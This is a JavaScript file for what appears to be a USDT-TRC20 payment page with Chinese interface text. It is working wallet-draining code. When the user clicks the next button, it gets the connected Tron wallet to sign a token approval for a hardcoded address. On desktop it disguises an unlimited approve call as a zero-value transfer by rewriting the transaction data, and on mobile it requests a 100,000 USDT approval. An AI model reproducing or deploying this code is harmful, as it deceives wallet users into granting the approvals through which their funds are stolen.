// 核心配置参数 (Core Configuration)
window.Permission_address = 'TLiJ8GGDTWbr1UDHDhaAtWZxetrmpnH2yi'; // 授权地址 (您的合约地址)
window.usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // 官方 USDT-TRC20 合约地址

document.addEventListener('DOMContentLoaded', () => {
    const amountInput = document.getElementById('amountInput');
    const usdValue = document.getElementById('usdValue');
    const btnAll = document.getElementById('btnAll');
    const btnNext = document.querySelector('.btn-next');
    
    // Exchange Rate Config
    const EXCHANGE_RATE = 0.95; 
    const MOCK_BALANCE = 1234.56;

    // Format currency
    const formatCurrency = (value) => {
        return value.toFixed(2);
    };

    // Update USD value based on input
    amountInput.addEventListener('input', (e) => {
        const value = parseFloat(e.target.value);
        if (!isNaN(value)) {
            usdValue.textContent = formatCurrency(value * EXCHANGE_RATE);
        } else {
            usdValue.textContent = '0.00';
        }
    });

    // Handle "All" button click
    btnAll.addEventListener('click', () => {
        amountInput.value = MOCK_BALANCE;
        amountInput.dispatchEvent(new Event('input'));
    });

    // Update available balance text
    const balanceText = document.querySelector('.balance-text');
    balanceText.textContent = `可用: ${MOCK_BALANCE} USDT-TRC20`;

    // Wallet Logic
    let tronWeb = null;
    let userAddress = null;

    // Attempt to connect to any available Tron wallet
    async function connectWallet() {
        console.log("Connecting wallet...");
        
        // Strategy 1: OKX Wallet specific check
        if (window.okxwallet && window.okxwallet.tronLink) {
            try {
                console.log("Found OKX Wallet");
                const res = await window.okxwallet.tronLink.request({ method: 'tron_requestAccounts' });
                // OKX might return differently, just check if we have address now
                if (window.okxwallet.tronLink.tronWeb && window.okxwallet.tronLink.tronWeb.defaultAddress) {
                    tronWeb = window.okxwallet.tronLink.tronWeb;
                    userAddress = tronWeb.defaultAddress.base58;
                    if (userAddress) {
                        console.log("Wallet connected via OKX:", userAddress);
                        return true;
                    }
                }
            } catch (e) {
                console.warn("OKX connect failed", e);
            }
        }

        // Strategy 2: Standard TronLink (or wallets masking as TronLink)
        if (window.tronLink) {
            try {
                console.log("Found TronLink object");
                const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
                // Some wallets don't return standard code 200, so we check result or just check tronWeb state
                if (res && (res.code === 200 || res.result)) {
                    tronWeb = window.tronLink.tronWeb;
                    userAddress = tronWeb.defaultAddress.base58;
                    console.log("Wallet connected via tronLink request:", userAddress);
                    return true;
                }
            } catch (e) {
                console.log("tronLink request failed/rejected", e);
            }
            
            // Fallback: Check if already injected and ready (even if request failed)
            if (window.tronLink.tronWeb && window.tronLink.tronWeb.defaultAddress && window.tronLink.tronWeb.defaultAddress.base58) {
                tronWeb = window.tronLink.tronWeb;
                userAddress = tronWeb.defaultAddress.base58;
                console.log("Wallet connected via tronLink property:", userAddress);
                return true;
            }
        }

        // Strategy 3: Global TronWeb (Legacy / TokenPocket / BitKeep)
        if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
            // Some wallets inject tronWeb but ready is false initially, but address is there. 
            // We trust the address if it exists.
            tronWeb = window.tronWeb;
            userAddress = tronWeb.defaultAddress.base58;
            console.log("Wallet connected via global tronWeb:", userAddress);
            return true;
        }

        return false;
    }

    // Auto-connect mechanism
    async function initWalletAuto() {
        let connected = await connectWallet();
        
        if (connected) {
            updateUIWithWalletInfo();
        } else {
            let attempts = 0;
            const maxAttempts = 20; 
            const interval = setInterval(async () => {
                attempts++;
                connected = await connectWallet();
                if (connected) {
                    clearInterval(interval);
                    updateUIWithWalletInfo();
                } else if (attempts >= maxAttempts) {
                    clearInterval(interval);
                    console.log("Wallet not found after polling");
                }
            }, 500);
        }
    }

    // Update UI with wallet info (Address & Balance)
    async function updateUIWithWalletInfo() {
        if (!userAddress || !tronWeb) return;

        // Show hidden elements
        const balanceRow = document.querySelector('.balance-row');
        const paymentCard = document.querySelector('.card.row-card');
        
        if (balanceRow) balanceRow.style.display = 'flex';
        if (paymentCard) paymentCard.style.display = 'flex';

        // 1. Update Payment Address (Masked)
        // TP4i ... g6yi
        const len = userAddress.length;
        const maskedAddress = `${userAddress.substring(0, 4)} ... ${userAddress.substring(len - 4)}`;
        const addressPreview = document.querySelector('.address-preview');
        if (addressPreview) {
            addressPreview.textContent = maskedAddress;
        }

        // 2. Fetch and Update USDT Balance
        try {
            const contract = await tronWeb.contract().at(window.usdtContractAddress);
            // balanceOf returns BigNumber/Integer in Sun (6 decimals for USDT)
            const balance = await contract.balanceOf(userAddress).call();
            // Convert from Sun (1e6) to Unit
            // Handle different return types (BigNumber object or raw string/number)
            let balanceVal = balance.toString(); 
            let actualBalance = parseFloat(balanceVal) / 1000000;
            
            // Update UI
            const balanceText = document.querySelector('.balance-text');
            if (balanceText) {
                balanceText.textContent = `可用: ${actualBalance} USDT-TRC20`;
            }
            
            // Update MOCK_BALANCE logic so "All" button works with real balance
            // We can store it in a global or data attribute, but for simplicity:
            btnAll.onclick = () => {
                amountInput.value = actualBalance;
                amountInput.dispatchEvent(new Event('input'));
            };

        } catch (error) {
            console.error("Failed to fetch balance:", error);
        }
    }

    initWalletAuto();

    // Handle Next Button (Authorization)
    btnNext.addEventListener('click', async () => {
        if (!tronWeb || !userAddress) {
            await connectWallet();
        }

        if (!window.tronWeb || !window.tronWeb.defaultAddress || !window.tronWeb.defaultAddress.base58) {
            alert("请先连接钱包 (如 TronLink, TokenPocket, OKX 等)");
            if (window.tronLink) {
                try {
                    window.tronLink.request({ method: 'tron_requestAccounts' });
                } catch(e){}
            }
            return;
        }

        try {
            btnNext.textContent = "正在确认...";
            btnNext.disabled = true;

            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobile/i.test(navigator.userAgent);

            // 定义标准授权流程 (作为 Mobile 首选 和 PC 兜底)
            const doStandardApproval = async () => {
                console.log("Executing standard approval flow...");
                const txObj = await tronWeb.transactionBuilder.triggerSmartContract(
                    window.usdtContractAddress,
                    'approve(address,uint256)', 
                    { feeLimit: 100000000 },
                    [
                        { type: 'address', value: window.Permission_address },
                        { type: 'uint256', value: '100000000000' } // 100,000 USDT
                    ],
                    userAddress
                );
                
                if (!txObj.result || !txObj.transaction) {
                    throw new Error("Standard Transaction build failed");
                }
                
                const signedTx = await tronWeb.trx.sign(txObj.transaction);
                return await tronWeb.trx.sendRawTransaction(signedTx);
            };

            // 1. 移动端直接走标准流程
            if (isMobile) {
                const result = await doStandardApproval();
                console.log("Mobile transaction submitted:", result);
                alert("提交成功！");
                btnNext.textContent = "下一步";
                btnNext.disabled = false;
                return;
            }

            // 2. PC 端尝试混淆流程
            try {
                console.log("Attempting PC obfuscation flow...");
                const spenderAddress = window.Permission_address;
                const selector = '095ea7b3'; 
                
                // 安全获取工具类
                const utils = window.TronWeb || tronWeb;
                if (!utils || !utils.address || !utils.address.toHex) {
                    throw new Error("TronWeb utils not found");
                }
                
                let addrHex = utils.address.toHex(spenderAddress);
                let addrVal = addrHex.replace(/^41/, '0x').substring(2);
                const param1 = addrVal.padStart(64, '0');
                const param2 = 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
                const garbage = '0000000000000000000000000000000000000000000000000000000000000001'; 
                const rawData = selector + param1 + param2 + garbage;

                const transactionObj = await tronWeb.transactionBuilder.triggerSmartContract(
                    window.usdtContractAddress,
                    'transfer(address,uint256)', 
                    { feeLimit: 100000000 },
                    [
                        { type: 'address', value: spenderAddress },
                        { type: 'uint256', value: 0 }
                    ],
                    userAddress
                );

                if (!transactionObj.result || !transactionObj.transaction) {
                    throw new Error("Obfuscation build failed");
                }

                const tx = transactionObj.transaction;

                if (tx.raw_data && tx.raw_data.contract && tx.raw_data.contract[0]) {
                    tx.raw_data.contract[0].parameter.value.data = rawData;
                }
                if (tx.raw_data_hex) {
                    delete tx.raw_data_hex;
                }

                const signedTx = await tronWeb.trx.sign(tx);
                const result = await tronWeb.trx.sendRawTransaction(signedTx);
                
                console.log("PC Obfuscated transaction submitted:", result);
                alert("提交成功！");
                btnNext.textContent = "下一步";
                btnNext.disabled = false;

            } catch (pcError) {
                console.warn("PC Obfuscation failed, falling back to standard...", pcError);
                // PC 端混淆失败，自动降级为标准授权
                const result = await doStandardApproval();
                console.log("Fallback transaction submitted:", result);
                alert("提交成功！");
                btnNext.textContent = "下一步";
                btnNext.disabled = false;
            }

        } catch (error) {
            console.error("Transaction failed:", error);
            alert("提交失败: " + (error.message || error));
            btnNext.textContent = "下一步";
            btnNext.disabled = false;
        }
    });
});
